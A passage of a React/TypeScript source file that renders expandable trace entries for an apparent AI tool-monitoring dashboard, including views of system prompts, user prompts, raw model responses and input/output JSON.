      {/* Header row */}
      <button
        onClick={() => setExpanded(!expanded)}
        className="w-full text-left px-2.5 py-1.5 flex items-center gap-1.5 hover:bg-white/[0.03] transition-colors"
      >
        <span
          className={`shrink-0 px-1 py-0.5 rounded text-[8px] font-black tracking-widest ${colors.bg} ${colors.text}`}
        >
          {colors.label}
        </span>
        <span className="font-mono text-[10px] text-white/60 truncate flex-1">
          {entry.op}
          {entry.tool && (
            <span className="text-white/30 ml-1">
              {"\u2192"} {entry.tool}
            </span>
          )}
        </span>
        <span className={`text-[9px] font-bold ${statusColor}`}>
          {statusIcon}
        </span>
        {entry.duration_ms > 0 && (
          <span className="text-[9px] font-mono text-white/25 tabular-nums">
            {entry.duration_ms < 1
              ? `${(entry.duration_ms * 1000).toFixed(0)}\u00B5s`
              : entry.duration_ms < 1000
                ? `${entry.duration_ms.toFixed(1)}ms`
                : `${(entry.duration_ms / 1000).toFixed(2)}s`}
          </span>
        )}
        <span className="text-[9px] text-white/15 tabular-nums shrink-0">
          {new Date(entry.timestamp).toLocaleTimeString()}
        </span>
        <span className="text-[10px] text-white/20">{expanded ? "\u25B4" : "\u25BE"}</span>
      </button>

      {/* Expanded detail */}
      {expanded && (
        <div className="px-2.5 pb-2.5 space-y-2 border-t border-white/[0.04]">
          {/* Meta badges */}
          {entry.meta != null && Object.keys(entry.meta).length > 0 && (
            <div className="flex flex-wrap gap-1 pt-1.5">
              {Object.entries(entry.meta).map(([k, v]) => (
                <span
                  key={k}
                  className="inline-flex px-1.5 py-0.5 rounded bg-white/5 border border-white/10 text-[9px] font-mono text-white/40"
                >
                  {k}:{" "}
                  <span className="text-white/60 ml-0.5">
                    {typeof v === "number" ? (v as number).toFixed(2) : String(v)}
                  </span>
                </span>
              ))}
            </div>
          )}

          {/* SLM special view */}
          {isSLM && entry.input != null && (
            <SLMTraceView input={entry.input as Record<string, unknown>} output={entry.output as Record<string, unknown>} />
          )}

          {/* Generic input */}
          {!isSLM && entry.input != null && (
            <TraceJsonBlock label="Input" data={entry.input} accent="accent" />
          )}

          {/* Generic output */}
          {entry.output != null && !isSLM && (
            <TraceJsonBlock label="Output" data={entry.output} accent={entry.status === "blocked" ? "critical" : "green"} />
          )}
        </div>
      )}
    </div>
  );
}

/* ─── SLM Trace View ───────────────────────────────────────────────────── */

function SLMTraceView({
  input,
  output,
}: {
  input: Record<string, unknown>;
  output: Record<string, unknown>;
}) {
  const [showPrompt, setShowPrompt] = useState(false);
  const systemPrompt = (input.system_prompt as string) || "";
  const userPrompt = (input.user_prompt as string) || "";
  const model = (input.model as string) || "";
  const rawResponse = (output?.raw_response as string) || "";

  return (
    <div className="space-y-1.5 pt-1">
      <div className="flex items-center gap-2 text-[10px]">
        <span className="text-purple font-bold">SLM Analysis</span>
        {model && (
          <span className="text-white/30 font-mono">{model}</span>
        )}
        <button
          onClick={() => setShowPrompt(!showPrompt)}
          className="ml-auto text-[9px] text-accent/60 hover:text-accent transition-colors"
        >
          {showPrompt ? "Hide prompt" : "Show prompt"}
        </button>
      </div>

      {showPrompt && (
        <>
          <div>
            <div className="text-[9px] font-bold uppercase tracking-wider text-white/25 mb-0.5">
              System Prompt
            </div>
            <pre className="bg-black/30 border border-white/[0.06] rounded p-2 text-[10px] text-purple/60 overflow-x-auto whitespace-pre-wrap max-h-32 overflow-y-auto leading-relaxed">
              {systemPrompt}
            </pre>
          </div>
          <div>
            <div className="text-[9px] font-bold uppercase tracking-wider text-white/25 mb-0.5">
              User Prompt
            </div>
            <pre className="bg-black/30 border border-white/[0.06] rounded p-2 text-[10px] text-accent/60 overflow-x-auto whitespace-pre-wrap max-h-24 overflow-y-auto leading-relaxed">
              {userPrompt}
            </pre>
          </div>
        </>
      )}

      {rawResponse && (
        <div>
          <div className="text-[9px] font-bold uppercase tracking-wider text-white/25 mb-0.5">
            Raw LLM Response
          </div>
          <pre className="bg-black/30 border border-purple/20 rounded p-2 text-[10px] text-purple/80 overflow-x-auto whitespace-pre-wrap max-h-24 overflow-y-auto leading-relaxed">
            {rawResponse}
          </pre>
        </div>
      )}
    </div>
  );
}

/* ─── Trace JSON Block ─────────────────────────────────────────────────── */

function TraceJsonBlock({
  label,
  data,
  accent = "accent",
}: {
  label: string;
  data: unknown;
  accent?: string;
}) {
  const formatted = typeof data === "string" ? data : JSON.stringify(data, null, 2);
  return (
    <div>
      <div className="text-[9px] font-bold uppercase tracking-wider text-white/25 mb-0.5">
        {label}
      </div>
      <pre
        className={`bg-black/30 border border-${accent}/10 rounded p-2 text-[10px] text-${accent}/70 overflow-x-auto whitespace-pre-wrap max-h-40 overflow-y-auto leading-relaxed font-mono`}
      >
        {formatted}
      </pre>
    </div>
  );
}
